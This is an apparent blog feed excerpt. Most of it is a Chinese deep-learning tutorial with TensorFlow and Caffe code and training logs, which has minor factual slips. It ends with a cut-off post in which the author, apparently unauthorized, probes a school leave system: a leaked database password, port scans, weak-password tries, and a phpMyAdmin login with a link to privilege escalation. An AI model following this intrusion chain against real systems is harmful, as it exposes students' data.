Encoder Hidden layer with sigmoid activation # 1    layer1 = tf.nn.sigmoid(tf.add(tf.matmul(x, weights[&#39;decoderH1&#39;]), biases[&#39;decoderB1&#39;]))    # Decoder Hidden layer with sigmoid activation # 2    layer2 = tf.nn.sigmoid(tf.add(tf.matmul(layer1, weights[&#39;decoderH2&#39;]), biases[&#39;decoderB2&#39;]))    return layer2# Construct modelencoderOp = encoder(X)decoderOp = decoder(encoderOp)# 因为自编码器中输入和输出相同，都设为X# PredictionyPred = decoderOp # 预测的结果# Targets (Labels) are the input data.yTrue = X # 真实的结果# Define loss and optimizer, minimize the squared errorcost = tf.reduce_mean(tf.pow(yTrue - yPred, 2)) # 计算MSEoptimizer = tf.train.AdamOptimizer(learningRate).minimize(cost) # 使用Adam算法优化# Initializing the variablesinit = tf.initialize_all_variables()# Launch the graphwith tf.Session() as sess:    sess.run(init)    totalBatch = int(mnist.train.num_examples / batchSize) # 计算Batch的数量    # Training cycle    for epoch in range(trainingEpochs):        # Loop over all batches        for i in range(totalBatch):            batchXs, batchYs = mnist.train.next_batch(batchSize) # max(x) = 1, min(x) = 0            # Run optimization op (backprop) and cost op (to get loss value)            _, c = sess.run([optimizer, cost], feed_dict={X: batchXs}) # 优化本层参数        # Display logs per epoch step        print(&#39;Epoch: {}, cost = {:.9f}&#39;.format((epoch + 1), c))    print(&#39;Optimization Finished!&#39;)    # Applying encode and decode over test set    decodeImages = sess.run(yPred, feed_dict={X:mnist.test.images[:examplesToShow]}) # 获取解压缩得到的图片    # Compare original images with their reconstructions    f, a = plt.subplots(2, 10, figsize=(10, 2))    for i in range(examplesToShow):        a[0][i].imshow(np.reshape(mnist.test.images[i], (28, 28)))        a[1][i].imshow(np.reshape(decodeImages[i], (28, 28)))    plt.show()</code></pre><p>训练的过程中 cost 逐渐减小：</p><pre><code class="bash">$ ./Auto-encoder.py...Epoch: 1, cost = 0.097858049Epoch: 2, cost = 0.091431484Epoch: 3, cost = 0.083604947Epoch: 4, cost = 0.078279205Epoch: 5, cost = 0.075574301Optimization Finished!</code></pre><p>识别效果：</p><p><img src="/pics/ANN-Deep-Learning/12.png" srcset="/img/loading.gif" alt></p><h2 id="Convolutional-Neural-Network"><a href="#Convolutional-Neural-Network" class="headerlink" title="Convolutional Neural Network"></a>Convolutional Neural Network</h2><p>深度学习主要依赖于卷积神经网络。卷积神经网络（CNN）是一种前馈神经网络，它的人工神经元可以响应一部分覆盖范围内的周围单元，对于大型图像处理有出色表现。卷积神经网络将原本由手工设计卷积核变成自动学习卷积核。</p><p>傅立叶变换：</p><p>$$<br>F(j\omega)=\int_{-\infty}^{+\infty}f(t)e^{-j\omega t}dt<br>$$</p><p>其中 $e^{-j\omega t}$ 为卷积核。</p><h3 id="LeNet"><a href="#LeNet" class="headerlink" title="LeNet"></a>LeNet</h3><p>由 LeCun 在上世纪 90 年代提出。</p><p><img src="/pics/ANN-Deep-Learning/13.png" srcset="/img/loading.gif" alt></p><p>LeNet 中主要有卷积（Convolution）、降采样（Subsampling）、全连接（Full connection）三种不同的神经网络层。</p><h4 id="Convolution"><a href="#Convolution" class="headerlink" title="Convolution"></a>Convolution</h4><p>假设有 <code>32x32x3</code> 的彩色图像（3 个通道），定义一个卷积核大小为 <code>5x5x3</code>，步长为 <code>[1,1]</code>。若不能全部卷积，可以选择对原图像进行补 0。通过卷积后生成一个 <code>28x28x1</code> 的特征图（Feature Map）：</p><p><img src="/pics/ANN-Deep-Learning/14.png" srcset="/img/loading.gif" alt></p><p>若图像为 $(M,N)$，卷积核大小为 $(m,n)$，步长为 $(u,v)$，那么最后得到的特征图（Feature Map）大小为 $(K,L)$，其中 $K≤\frac{M-m}{u}+1$、$L≤\frac{N-n}{v}+1$。可以将图像卷积看成全连接网络的权值共享（Weight Sharing，权值共享网络）：</p><p><img src="/pics/ANN-Deep-Learning/15.png" srcset="/img/loading.gif" alt></p><p>$$<br>\begin{array}{l}<br>p_1=\omega_1*x_1+\omega_2*x_2+\omega_3*x_4+\omega_4*x5+b_1\\<br>p_2=\omega_1*x_2+\omega_2*x_3+\omega_3*x_5+\omega_4*x6+b_2\\<br>p_3=\omega_1*x_4+\omega_2*x_5+\omega_3*x_7+\omega_4*x8+b_3\\<br>p_4=\omega_1*x_5+\omega_2*x_6+\omega_3*x_8+\omega_4*x9+b_4<br>\end{array}<br>$$</p><p>如果使用 6 个卷积核 就能获得 6 个特征图。若无偏置，共有 $5\times5\times3\times6=450$ 个数；若有偏置，共有 $(5\times5\times5+1)\times6=456$ 个数。做完卷积后，还需要调用 ReLU 等函数进行非线性处理：</p><p><img src="/pics/ANN-Deep-Learning/16.png" srcset="/img/loading.gif" alt></p><h4 id="Subsampling"><a href="#Subsampling" class="headerlink" title="Subsampling"></a>Subsampling</h4><p>每取一个小方阵，取平均值作为新的数。</p><p><img src="/pics/ANN-Deep-Learning/17.png" srcset="/img/loading.gif" alt></p><h4 id="Full-connection"><a href="#Full-connection" class="headerlink" title="Full connection"></a>Full connection</h4><p>将特征值完全展开，两层之间每两个神经元互相连接，和多层神经网络基本一致：</p><p><img src="/pics/ANN-Deep-Learning/18.png" srcset="/img/loading.gif" alt></p><p>其中 MSE 采用 Softmax 函数和交叉熵合用的形式：</p><p>$\begin{cases}Softmax(z)=p\\ E=-\sum_{i=1}^{10}Y_i\log(p_i)\end{cases}$</p><h3 id="AlexNet"><a href="#AlexNet" class="headerlink" title="AlexNet"></a>AlexNet</h3><p>2013 年，Alex Krizhevsky 构建了一个包含 65 万个神经元、超过 6000 万个参数的大规模网络 AlexNet，在 ImageNet 的测试集上获得了非常好的成绩，遥遥领先于第二名。</p><p><img src="/pics/ANN-Deep-Learning/19.png" srcset="/img/loading.gif" alt></p><p>AlexNet 在网络结构上和 LeNet 基本一致。主要有一些改进之处：</p><ol><li>以 ReLU 函数替代 Sigmoid 或 tanh 函数：$ReLU(x)=\max(0,x)$，使网络训练更快速度收敛；</li><li>为降采样操作起了一个新的名字——池化（Pooling），即将邻近的像素作为一个“池子”来重新考虑；<ul><li>AlexNet 中提出了最大池化（Max Pooling）的概念，即对每一个邻近像素组成的“池子”，选取像素的最大值作为输出；</li><li>有重叠的最大池化能够很好地克服过拟合问题，提升系统性能。</li></ul></li><li>随机丢弃（Dropout）。为了避免系统参数更新过快导致过拟合，每次利用训练样本更新参数的时候，随机“丢弃”一定比例的神经元，被丢弃的神经元将不参加训练过程，输入和输出该神经元的权重系数也不做更新，每次训练时的网络架构不一样，但是分享共同的权重系数；<ul><li>减缓了网络收敛速度，也以大概率避免了过拟合的发生。</li></ul></li><li>增加训练样本；<ul><li>将原图水平翻转；</li><li>将 256x256 的图像随机选取 224x224 的片段作为输入图像；</li><li>对每幅图片引入一定的噪声，构成新的图像。</li></ul></li><li>用 GPU 加速训练过程（使用两个 GPU 并行运算）。</li></ol><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ul><li>Caffe（UC Berkeley） -&gt; Caffe2（Facebook）</li><li>Torch（NYU/Facebook） -&gt; PyTorch（Facebook）</li><li>Theano（U Montreal） -&gt; TensorFlow（Google）</li><li>Paddle（Baidu）</li><li>CNTK（Microsoft）</li><li>MXNet（Amazon）</li></ul><h3 id="TensorFlow"><a href="#TensorFlow" class="headerlink" title="TensorFlow"></a>TensorFlow</h3><p>实现 LeNet：</p><pre><code class="python">#!/usr/bin/env python3import tensorflow.compat.v1 as tftf.disable_v2_behavior()def weight_variable(shape): # 设置权重w    initial = tf.truncated_normal(shape, stddev=0.1)    return tf.Variable(initial)def bias_variable(shape): # 设置偏置b    initial = tf.constant(0.1, shape=shape)    return tf.Variable(initial)def conv2d(x, W, padding_method=&#39;SAME&#39;): # 卷积函数    return tf.nn.conv2d(x, W, strides=[1, 1, 1, 1], padding=padding_method)def max_pool_2x2(x): # 最大池化    return tf.nn.max_pool(x, ksize=[1, 2, 2, 1], strides=[1, 2, 2, 1], padding=&#39;SAME&#39;)def average_pool_2x2(x): # 平均池化    return tf.nn.avg_pool(x, ksize=[1, 2, 2, 1], strides=[1, 2, 2, 1], padding=&#39;SAME&#39;)from tensorflow.examples.tutorials.mnist import input_datamnist = input_data.read_data_sets(&#39;/tmp/data/&#39;, one_hot=True)sess = tf.InteractiveSession()x = tf.placeholder(&#39;float&#39;, shape=[None, 784]) # 输入图像大小为28*28y_ = tf.placeholder(&#39;float&#39;, shape=[None, 10]) # 输出结果为10个数字# 第一层卷积W_conv1 = weight_variable([5, 5, 1, 6])b_conv1 = bias_variable([6])# 第二层降采样x_image = tf.reshape(x, [-1, 28, 28, 1])h_conv1 = tf.nn.relu(conv2d(x_image, W_conv1) + b_conv1) # 非线性化h_pool1 = average_pool_2x2(h_conv1) # 平均池化# 第三层卷积W_conv2 = weight_variable([5, 5, 6, 16])b_conv2 = bias_variable([16])# 第四层降采样h_conv2 = tf.nn.relu(conv2d(h_pool1, W_conv2, &#39;VALID&#39;) + b_conv2) # 非线性化h_pool2 = average_pool_2x2(h_conv2) # 平均池化# 第五层全连接网络W_fc1 = weight_variable([5 * 5 * 16, 120])b_fc1 = bias_variable([120])h_pool2_flat = tf.reshape(h_pool2, [-1, 5 * 5 * 16])h_fc1 = tf.nn.relu(tf.matmul(h_pool2_flat, W_fc1) + b_fc1) # 非线性化keep_prob = tf.placeholder(&#39;float&#39;)h_fc1_drop = tf.nn.dropout(h_fc1, keep_prob) # 随机丢弃# 第六层全连接网络W_fc2 = weight_variable([120, 84])b_fc2 = bias_variable([84])h_fc2 = tf.nn.relu(tf.matmul(h_fc1_drop, W_fc2) + b_fc2) # 非线性化h_fc2_drop = tf.nn.dropout(h_fc2, keep_prob) # 随机丢弃# 第七层全连接网络W_fc3 = weight_variable([84, 10])b_fc3 = bias_variable([10])y_conv = tf.nn.softmax(tf.matmul(h_fc2_drop, W_fc3) + b_fc3) # MSEcross_entropy = -tf.reduce_sum(y_ * tf.log(y_conv))train_step = tf.train.AdamOptimizer(1e-4).minimize(cross_entropy) # Adam优化算法correct_prediction = tf.equal(tf.argmax(y_conv, 1), tf.argmax(y_, 1))accuracy = tf.reduce_mean(tf.cast(correct_prediction, &#39;float&#39;)) # 准确率sess.run(tf.global_variables_initializer())for i in range(10000):    batch = mnist.train.next_batch(50)    if i % 100 == 0:        train_accuracy = accuracy.eval(feed_dict={x:batch[0], y_:batch[1], keep_prob:1.0})        print(&#39;step %d, training accuracy %g&#39; % (i, train_accuracy))    train_step.run(feed_dict={x: batch[0], y_: batch[1], keep_prob: 0.5})print(&#39;test accuracy %g&#39; % accuracy.eval(feed_dict={x:mnist.test.images, y_:mnist.test.labels, keep_prob:1.0}))</code></pre><p>测试的准确率大致为 95.77%：</p><pre><code class="bash">$ ./classfication.py...step 0, training accuracy 0.1step 100, training accuracy 0.38step 200, training accuracy 0.48step 300, training accuracy 0.72step 400, training accuracy 0.72step 500, training accuracy 0.72step 600, training accuracy 0.78step 700, training accuracy 0.7step 800, training accuracy 0.9step 900, training accuracy 0.82step 1000, training accuracy 0.9step 1100, training accuracy 0.9...step 8500, training accuracy 0.92step 8600, training accuracy 0.96step 8700, training accuracy 0.98step 8800, training accuracy 0.96step 8900, training accuracy 0.98step 9000, training accuracy 0.98step 9100, training accuracy 0.98step 9200, training accuracy 0.9step 9300, training accuracy 0.96step 9400, training accuracy 0.92step 9500, training accuracy 0.94step 9600, training accuracy 0.92step 9700, training accuracy 0.98step 9800, training accuracy 0.96step 9900, training accuracy 0.92...test accuracy 0.9577</code></pre><h3 id="Caffe"><a href="#Caffe" class="headerlink" title="Caffe"></a>Caffe</h3><blockquote><p>使用 Caffe 时务必将所有相对路径改为绝对路径。</p></blockquote><p>以 MNIST 上的数据集为例（这里略过安装 Caffe 和下载 MNIST 数据集的过程）。首先通过下载得到的数据创建 lmdb 文件：</p><pre><code class="bash">#!/bin/shset -eDATA=&quot;$HOME/caffe/examples/mnist&quot;BUILD=&quot;$HOME/caffe/build/tools&quot;rm -rf $DATA/mean.binaryproto$BUILD/compute_image_mean $DATA/mnist_train_lmdb $DATA/mean.binaryproto $@</code></pre><p>将 <code>lenet_solver.prototxt</code> 设置如下，一组 Batch 设为 100 个样本，学习率设置为 0.01，每 100 次迭代训练输出一次，每 5000 组存一次快照，最后使用 CPU 进行运算：</p><pre><code class="bash"># The train/test net protocol buffer definitionnet: &quot;/root/caffe/examples/mnist/lenet_train_test.prototxt&quot;# test_iter specifies how many forward passes the test should carry out.# In the case of MNIST, we have test batch size 100 and 100 test iterations,# covering the full 10,000 testing images.test_iter: 100# Carry out testing every 500 training iterations.test_interval: 500# The base learning rate, momentum and the weight decay of the network.base_lr: 0.01momentum: 0.0weight_decay: 0.0005# The learning rate policylr_policy: &quot;inv&quot;gamma: 0.0001power: 0.75# Display every 100 iterationsdisplay: 100# The maximum number of iterationsmax_iter: 10000# snapshot intermediate resultssnapshot: 5000snapshot_prefix: &quot;/root/caffe/examples/mnist/lenet&quot;# solver mode: CPU or GPUsolver_mode: CPU</code></pre><p>训练脚本中设置好 Solver 的路径：</p><pre><code class="bash">#!/bin/shset -eDATA=&quot;$HOME/caffe/examples/mnist&quot;BUILD=&quot;$HOME/caffe/build/tools&quot;$BUILD/caffe train --solver=$DATA/lenet_solver.prototxt $@</code></pre><p>训练得到的准确率为 98.35%：</p><pre><code class="bash">$ ./train_lenet.shI0719 09:13:32.369788  3384 caffe.cpp:197] Use CPU.I0719 09:13:32.370246  3384 solver.cpp:45] Initializing solver from parameters:test_iter: 100test_interval: 500base_lr: 0.01display: 100max_iter: 10000lr_policy: &quot;inv&quot;gamma: 0.0001power: 0.75momentum: 0weight_decay: 0.0005snapshot: 5000snapshot_prefix: &quot;/root/caffe/examples/mnist/lenet&quot;solver_mode: CPUnet: &quot;/root/caffe/examples/mnist/lenet_train_test.prototxt&quot;train_state {  level: 0  stage: &quot;&quot;}I0719 09:13:32.371068  3384 solver.cpp:102] Creating training net from net file: /root/caffe/examples/mnist/lenet_train_test.prototxtI0719 09:13:32.371302  3384 net.cpp:296] The NetState phase (0) differed from the phase (1) specified by a rule in layer mnistI0719 09:13:32.371356  3384 net.cpp:296] The NetState phase (0) differed from the phase (1) specified by a rule in layer accuracyI0719 09:13:32.371500  3384 net.cpp:53] Initializing net from parameters:name: &quot;LeNet&quot;state {  phase: TRAIN  level: 0  stage: &quot;&quot;}layer {  name: &quot;mnist&quot;  type: &quot;Data&quot;  top: &quot;data&quot;  top: &quot;label&quot;  include {    phase: TRAIN  }  transform_param {    scale: 0.00390625  }  data_param {    source: &quot;/root/caffe/examples/mnist/mnist_train_lmdb&quot;    batch_size: 64    backend: LMDB  }}...layer {  name: &quot;loss&quot;  type: &quot;SoftmaxWithLoss&quot;  bottom: &quot;ip2&quot;  bottom: &quot;label&quot;  top: &quot;loss&quot;}I0719 09:13:32.375864  3384 layer_factory.hpp:77] Creating layer mnistI0719 09:13:32.378401  3384 db_lmdb.cpp:35] Opened lmdb /root/caffe/examples/mnist/mnist_train_lmdb...I0719 09:13:32.389917  3384 net.cpp:257] Network initialization done.I0719 09:13:32.390131  3384 solver.cpp:190] Creating test net (#0) specified by net file: /root/caffe/examples/mnist/lenet_train_test.prototxtI0719 09:13:32.390213  3384 net.cpp:296] The NetState phase (1) differed from the phase (0) specified by a rule in layer mnistI0719 09:13:32.390334  3384 net.cpp:53] Initializing net from parameters:name: &quot;LeNet&quot;state {  phase: TEST}layer {  name: &quot;mnist&quot;  type: &quot;Data&quot;  top: &quot;data&quot;  top: &quot;label&quot;  include {    phase: TEST  }  transform_param {    scale: 0.00390625  }  data_param {    source: &quot;/root/caffe/examples/mnist/mnist_test_lmdb&quot;    batch_size: 100    backend: LMDB  }}...layer {  name: &quot;loss&quot;  type: &quot;SoftmaxWithLoss&quot;  bottom: &quot;ip2&quot;  bottom: &quot;label&quot;  top: &quot;loss&quot;}I0719 09:13:32.394325  3384 layer_factory.hpp:77] Creating layer mnistI0719 09:13:32.396040  3384 db_lmdb.cpp:35] Opened lmdb /root/caffe/examples/mnist/mnist_test_lmdbI0719 09:13:32.399293  3384 net.cpp:86] Creating Layer mnist...I0719 09:13:32.408589  3384 net.cpp:257] Network initialization done.I0719 09:13:32.408671  3384 solver.cpp:57] Solver scaffolding done.I0719 09:13:32.408725  3384 caffe.cpp:239] Starting OptimizationI0719 09:13:32.408758  3384 solver.cpp:289] Solving LeNetI0719 09:13:32.408789  3384 solver.cpp:290] Learning Rate Policy: invI0719 09:13:32.409927  3384 solver.cpp:347] Iteration 0, Testing net (#0)I0719 09:13:37.804333  3387 data_layer.cpp:73] Restarting data prefetching from start.I0719 09:13:38.027662  3384 solver.cpp:414]     Test net output #0: accuracy = 0.1248I0719 09:13:38.027835  3384 solver.cpp:414]     Test net output #1: loss = 2.39762 (* 1 = 2.39762 loss)I0719 09:13:38.118224  3384 solver.cpp:239] Iteration 0 (-6.72623e-44 iter/s, 5.709s/100 iters), loss = 2.36513I0719 09:13:38.118404  3384 solver.cpp:258]     Train net output #0: loss = 2.36513 (* 1 = 2.36513 loss)I0719 09:13:38.118474  3384 sgd_solver.cpp:112] Iteration 0, lr = 0.01I0719 09:13:47.032905  3384 solver.cpp:239] Iteration 100 (11.2183 iter/s, 8.914s/100 iters), loss = 0.696854I0719 09:13:47.033085  3384 solver.cpp:258]     Train net output #0: loss = 0.696854 (* 1 = 0.696854 loss)I0719 09:13:47.033146  3384 sgd_solver.cpp:112] Iteration 100, lr = 0.00992565I0719 09:13:55.957051  3384 solver.cpp:239] Iteration 200 (11.207 iter/s, 8.923s/100 iters), loss = 0.349362I0719 09:13:55.957224  3384 solver.cpp:258]     Train net output #0: loss = 0.349362 (* 1 = 0.349362 loss)I0719 09:13:55.957285  3384 sgd_solver.cpp:112] Iteration 200, lr = 0.00985258I0719 09:14:04.869757  3384 solver.cpp:239] Iteration 300 (11.2208 iter/s, 8.912s/100 iters), loss = 0.329913I0719 09:14:04.870034  3384 solver.cpp:258]     Train net output #0: loss = 0.329913 (* 1 = 0.329913 loss)I0719 09:14:04.870095  3384 sgd_solver.cpp:112] Iteration 300, lr = 0.00978075...I0719 09:21:36.396572  3384 solver.cpp:239] Iteration 4800 (11.2309 iter/s, 8.904s/100 iters), loss = 0.132899I0719 09:21:36.396747  3384 solver.cpp:258]     Train net output #0: loss = 0.132899 (* 1 = 0.132899 loss)I0719 09:21:36.396808  3384 sgd_solver.cpp:112] Iteration 4800, lr = 0.00745253I0719 09:21:45.291420  3384 solver.cpp:239] Iteration 4900 (11.2435 iter/s, 8.894s/100 iters), loss = 0.0251573I0719 09:21:45.291604  3384 solver.cpp:258]     Train net output #0: loss = 0.0251575 (* 1 = 0.0251575 loss)I0719 09:21:45.291664  3384 sgd_solver.cpp:112] Iteration 4900, lr = 0.00741498I0719 09:21:54.117733  3384 solver.cpp:464] Snapshotting to binary proto file /root/caffe/examples/mnist/lenet_iter_5000.caffemodelI0719 09:21:54.126977  3384 sgd_solver.cpp:284] Snapshotting solver state to binary proto file /root/caffe/examples/mnist/lenet_iter_5000.solverstateI0719 09:21:54.130437  3384 solver.cpp:347] Iteration 5000, Testing net (#0)I0719 09:21:59.522549  3387 data_layer.cpp:73] Restarting data prefetching from start.I0719 09:21:59.746923  3384 solver.cpp:414]     Test net output #0: accuracy = 0.9807I0719 09:21:59.747100  3384 solver.cpp:414]     Test net output #1: loss = 0.0614721 (* 1 = 0.0614721 loss)I0719 09:21:59.833456  3384 solver.cpp:239] Iteration 5000 (6.87711 iter/s, 14.541s/100 iters), loss = 0.0629105I0719 09:21:59.833653  3384 solver.cpp:258]     Train net output #0: loss = 0.0629108 (* 1 = 0.0629108 loss)I0719 09:21:59.833714  3384 sgd_solver.cpp:112] Iteration 5000, lr = 0.00737788I0719 09:22:08.751772  3384 solver.cpp:239] Iteration 5100 (11.2133 iter/s, 8.918s/100 iters), loss = 0.134128I0719 09:22:08.751960  3384 solver.cpp:258]     Train net output #0: loss = 0.134128 (* 1 = 0.134128 loss)I0719 09:22:08.752022  3384 sgd_solver.cpp:112] Iteration 5100, lr = 0.0073412...I0719 09:29:50.077375  3384 solver.cpp:239] Iteration 9700 (11.2309 iter/s, 8.904s/100 iters), loss = 0.0202741I0719 09:29:50.077550  3384 solver.cpp:258]     Train net output #0: loss = 0.0202745 (* 1 = 0.0202745 loss)I0719 09:29:50.077612  3384 sgd_solver.cpp:112] Iteration 9700, lr = 0.00601382I0719 09:29:58.986270  3384 solver.cpp:239] Iteration 9800 (11.2259 iter/s, 8.908s/100 iters), loss = 0.158889I0719 09:29:58.986459  3384 solver.cpp:258]     Train net output #0: loss = 0.15889 (* 1 = 0.15889 loss)I0719 09:29:58.986519  3384 sgd_solver.cpp:112] Iteration 9800, lr = 0.00599102I0719 09:30:07.907111  3384 solver.cpp:239] Iteration 9900 (11.2108 iter/s, 8.92s/100 iters), loss = 0.0175776I0719 09:30:07.907289  3384 solver.cpp:258]     Train net output #0: loss = 0.0175779 (* 1 = 0.0175779 loss)I0719 09:30:07.907397  3384 sgd_solver.cpp:112] Iteration 9900, lr = 0.00596843I0719 09:30:16.723201  3384 solver.cpp:464] Snapshotting to binary proto file /root/caffe/examples/mnist/lenet_iter_10000.caffemodelI0719 09:30:16.732036  3384 sgd_solver.cpp:284] Snapshotting solver state to binary proto file /root/caffe/examples/mnist/lenet_iter_10000.solverstateI0719 09:30:16.772199  3384 solver.cpp:327] Iteration 10000, loss = 0.041269I0719 09:30:16.772374  3384 solver.cpp:347] Iteration 10000, Testing net (#0)I0719 09:30:22.153097  3387 data_layer.cpp:73] Restarting data prefetching from start.I0719 09:30:22.376965  3384 solver.cpp:414]     Test net output #0: accuracy = 0.9835I0719 09:30:22.377146  3384 solver.cpp:414]     Test net output #1: loss = 0.0502197 (* 1 = 0.0502197 loss)I0719 09:30:22.377204  3384 solver.cpp:332] Optimization Done.I0719 09:30:22.377256  3384 caffe.cpp:250] Optimization Done.</code></pre><p>使用快照存下的权重系数进行测试：</p><pre><code class="bash">#!/bin/shset -eDATA=&quot;$HOME/caffe/examples/mnist&quot;BUILD=&quot;$HOME/caffe/build/tools&quot;$BUILD/caffe test -model $DATA/lenet_train_test.prototxt -weights $DATA/lenet_iter_10000.caffemodel -iterations 100 $@</code></pre><p>测试得到的结果也是 98.35%：</p><pre><code class="bash">$ ./test_lenet.shI0719 09:54:00.532202  3750 caffe.cpp:275] Use CPU.I0719 09:54:00.534042  3750 net.cpp:296] The NetState phase (1) differed from the phase (0) specified by a rule in layer mnistI0719 09:54:00.534274  3750 net.cpp:53] Initializing net from parameters:name: &quot;LeNet&quot;state {  phase: TEST  level: 0  stage: &quot;&quot;}layer {  name: &quot;mnist&quot;  type: &quot;Data&quot;  top: &quot;data&quot;  top: &quot;label&quot;  include {    phase: TEST  }  transform_param {    scale: 0.00390625  }  data_param {    source: &quot;/root/caffe/examples/mnist/mnist_test_lmdb&quot;    batch_size: 100    backend: LMDB  }}...layer {  name: &quot;loss&quot;  type: &quot;SoftmaxWithLoss&quot;  bottom: &quot;ip2&quot;  bottom: &quot;label&quot;  top: &quot;loss&quot;}I0719 09:54:00.539016  3750 layer_factory.hpp:77] Creating layer mnistI0719 09:54:00.539180  3750 db_lmdb.cpp:35] Opened lmdb /root/caffe/examples/mnist/mnist_test_lmdbI0719 09:54:00.539252  3750 net.cpp:86] Creating Layer mnist...I0719 09:54:00.549928  3750 net.cpp:257] Network initialization done.I0719 09:54:00.578881  3750 caffe.cpp:281] Running for 100 iterations.I0719 09:54:00.638658  3750 caffe.cpp:304] Batch 0, accuracy = 1I0719 09:54:00.638818  3750 caffe.cpp:304] Batch 0, loss = 0.0125258I0719 09:54:00.695282  3750 caffe.cpp:304] Batch 1, accuracy = 1I0719 09:54:00.695446  3750 caffe.cpp:304] Batch 1, loss = 0.014934I0719 09:54:00.751154  3750 caffe.cpp:304] Batch 2, accuracy = 0.97I0719 09:54:00.751315  3750 caffe.cpp:304] Batch 2, loss = 0.0793383I0719 09:54:00.807118  3750 caffe.cpp:304] Batch 3, accuracy = 0.99I0719 09:54:00.807282  3750 caffe.cpp:304] Batch 3, loss = 0.0438309I0719 09:54:00.867218  3750 caffe.cpp:304] Batch 4, accuracy = 0.98I0719 09:54:00.868525  3750 caffe.cpp:304] Batch 4, loss = 0.0713425I0719 09:54:00.924510  3750 caffe.cpp:304] Batch 5, accuracy = 0.99I0719 09:54:00.924670  3750 caffe.cpp:304] Batch 5, loss = 0.0617221I0719 09:54:00.980692  3750 caffe.cpp:304] Batch 6, accuracy = 0.97I0719 09:54:00.980855  3750 caffe.cpp:304] Batch 6, loss = 0.0743186I0719 09:54:01.036712  3750 caffe.cpp:304] Batch 7, accuracy = 0.96I0719 09:54:01.036875  3750 caffe.cpp:304] Batch 7, loss = 0.0618587I0719 09:54:01.093209  3750 caffe.cpp:304] Batch 8, accuracy = 1I0719 09:54:01.093359  3750 caffe.cpp:304] Batch 8, loss = 0.0243737...I0719 09:54:05.863339  3750 caffe.cpp:304] Batch 93, accuracy = 1I0719 09:54:05.863505  3750 caffe.cpp:304] Batch 93, loss = 0.0035342I0719 09:54:05.919293  3750 caffe.cpp:304] Batch 94, accuracy = 1I0719 09:54:05.919464  3750 caffe.cpp:304] Batch 94, loss = 0.00404837I0719 09:54:05.975389  3750 caffe.cpp:304] Batch 95, accuracy = 1I0719 09:54:05.975559  3750 caffe.cpp:304] Batch 95, loss = 0.00803444I0719 09:54:05.975966  3752 data_layer.cpp:73] Restarting data prefetching from start.I0719 09:54:06.031582  3750 caffe.cpp:304] Batch 96, accuracy = 0.97I0719 09:54:06.031741  3750 caffe.cpp:304] Batch 96, loss = 0.101935I0719 09:54:06.087718  3750 caffe.cpp:304] Batch 97, accuracy = 0.94I0719 09:54:06.087873  3750 caffe.cpp:304] Batch 97, loss = 0.169228I0719 09:54:06.143560  3750 caffe.cpp:304] Batch 98, accuracy = 0.99I0719 09:54:06.143725  3750 caffe.cpp:304] Batch 98, loss = 0.0384616I0719 09:54:06.199724  3750 caffe.cpp:304] Batch 99, accuracy = 0.99I0719 09:54:06.199882  3750 caffe.cpp:304] Batch 99, loss = 0.023861I0719 09:54:06.199935  3750 caffe.cpp:309] Loss: 0.0502197I0719 09:54:06.200014  3750 caffe.cpp:321] accuracy = 0.9835I0719 09:54:06.200079  3750 caffe.cpp:321] loss = 0.0502197 (* 1 = 0.0502197 loss)</code></pre><h2 id="流行的卷积神经网络结构"><a href="#流行的卷积神经网络结构" class="headerlink" title="流行的卷积神经网络结构"></a>流行的卷积神经网络结构</h2><ul><li>LeNet</li><li>AlexNet</li><li>VGGNet</li><li>GooglLeNet</li><li>ResNet（Residual Net）</li></ul><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p>浙江大学信电学院《机器学习》课程<br>《机器学习》——周志华<br><a href="https://morvanzhou.github.io/tutorials/machine-learning/tensorflow/" target="_blank" rel="noopener">莫烦 Python——搭建自己的神经网络</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;人工神经网络和深度学习入门。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ann" scheme="blog.b3ale.cn/tags/ann/"/>
    
      <category term="dl" scheme="blog.b3ale.cn/tags/dl/"/>
    
  </entry>
  
  <entry>
    <title>记一次对学校请假系统的渗透测试</title>
    <link href="blog.b3ale.cn/2020/07/12/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E5%AD%A6%E6%A0%A1%E8%AF%B7%E5%81%87%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <id>blog.b3ale.cn/2020/07/12/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E5%AD%A6%E6%A0%A1%E8%AF%B7%E5%81%87%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</id>
    <published>2020-07-12T12:16:20.000Z</published>
    <updated>2020-07-13T15:01:45.000Z</updated>
    
    <content type="html"><![CDATA[<p>****************************。</p><a id="more"></a><h1 id="Prologue"><a href="#Prologue" class="headerlink" title="Prologue"></a>Prologue</h1><p>好奇出校码怎么生成的，就试了一下，结果发现了信息泄漏。</p><h1 id="Pentesting"><a href="#Pentesting" class="headerlink" title="Pentesting"></a>Pentesting</h1><p>在获取出校凭证的 JS 代码中通过一个接口获取出校码：</p><p><img src="/pics/记一次对学校请假系统的渗透测试/1.png" srcset="/img/loading.gif" alt></p><p>如果传入错误的 ID，就会报错。这个时候会泄漏部分代码以及数据库密码：</p><p><img src="/pics/记一次对学校请假系统的渗透测试/2.png" srcset="/img/loading.gif" alt></p><p>尝试了以下连接数据库，发现数据库设置了远程不可登录。扫端口，试了 ftp、ssh 弱口令都没有成功。发现一个可疑的 10789 端口：</p><p><img src="/pics/记一次对学校请假系统的渗透测试/3.png" srcset="/img/loading.gif" alt></p><p>打开后是 LNMP 安装成功的界面，包括 phpinfo、phpMyAdmin、探针等后台可以进入。扫目录也能看到：</p><p><img src="/pics/记一次对学校请假系统的渗透测试/4.png" srcset="/img/loading.gif" alt></p><p>用前面得到的密码，测试在本地可以连接数据库：</p><p><img src="/pics/记一次对学校请假系统的渗透测试/5.png" srcset="/img/loading.gif" alt></p><p>在 phpMyAdmin 中可以用相同的密码登录管理后台。之后<a href="https://phyb0x.github.io/2018/10/04/phpmyadmin%E6%8F%90%E6%9D%83/" target="_blank" rel="noopener">进一步还能拿服务器权限</a>：</p><p><img src="/pics/记一次对学校请假系统的渗透测试/6.png" srcset="/img/loading.gif" alt></p><blockquote><p>开放在外网的网站有这种问题，相当于把全校的信息暴露给了别人，对这种不负责任的开发感到很无奈。</p></blockquote><h1 id="Advice"><a href="#Advice" 